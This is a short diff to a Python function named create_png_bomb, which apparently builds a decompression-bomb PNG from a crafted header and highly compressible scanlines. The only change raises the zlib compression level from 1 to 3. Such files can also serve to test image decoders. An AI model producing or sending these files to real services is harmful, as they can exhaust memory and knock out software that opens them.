@@ -15,7 +15,7 @@ def create_png_bomb(width, height, filename, mode='gray'):
     color_type, bpp = {'gray': (0, 1), 'rgb': (2, 3), 'rgba': (6, 4)}[mode]
     ihdr = struct.pack('>IIBBBBB', width, height, 8, color_type, 0, 0, 0)
 
-    comp = zlib.compressobj(1, zlib.DEFLATED, 15)
+    comp = zlib.compressobj(3, zlib.DEFLATED, 15)
     line_len = 1 + width * bpp
 
     first_line = b'\x00' + bytes([0x80] * (width * bpp))
